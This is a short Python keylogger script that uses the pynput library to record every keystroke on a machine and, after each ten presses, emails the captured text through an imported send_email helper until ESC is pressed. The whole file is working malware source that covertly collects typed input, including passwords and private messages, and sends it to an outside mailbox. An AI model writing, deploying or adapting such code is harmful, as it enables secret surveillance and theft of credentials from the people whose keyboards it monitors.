import pynput
from pynput.keyboard import Key, Listener
import send_email

count = 0
keys = []

# Function that runs when a key is pressed
def on_press(key):
    print(f"{key} pressed")
    global keys, count
    keys.append(str(key))  # Store pressed keys as strings
    count += 1

    # Send email after 10 key presses
    if count >= 10:
        count = 0  # Reset the count
        email(keys)  # Send email with the captured keys
        keys.clear()  # Clear the keys list after sendding

# Function to process keys and send email
def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")  # Remove single quotes
        if key == "Key.space":  # Replace "Key.space" with an actual space
            k = " "
        elif "Key" in key:  # Ignore special keys like "Key.shift"
            k = ""
        message += k
    print(f"Message to send: {message}")  # Print the message for debugging
    send_email.sendEmail(message)  # Call sendEmail function to send the message

# Function that runs when a key is released
def on_release(key):
    if key == Key.esc:
        return False  # Stop the listener when "ESC" is pressed

# Listener to capture keypresses
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
